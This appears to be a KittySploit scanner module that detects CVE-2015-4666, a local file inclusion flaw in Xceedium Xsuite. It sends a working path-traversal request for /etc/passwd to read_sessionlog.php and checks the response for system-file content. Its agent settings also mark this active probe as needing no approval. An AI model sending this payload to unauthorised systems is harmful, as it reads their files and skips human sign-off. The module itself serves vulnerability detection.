#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Xceedium Xsuite read_sessionlog.php LFI (CVE-2015-4666)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Xceedium Xsuite - read_sessionlog LFI Detection',
        'description': (
            'Detects Xceedium Xsuite LFI via /opm/read_sessionlog.php?logFile=....//etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'xceedium', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4666',
        ],
        'cve': 'CVE-2015-4666',
    }

    def run(self):
        path = '/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if re.search(r'root:.*:0:[01]:', body) or '; for 16-bit app support' in body or '[boot loader]' in body:
            self.set_info(
                severity='high',
                reason='Xceedium Xsuite read_sessionlog LFI',
                path='/opm/read_sessionlog.php',
            )
            return True
        return False
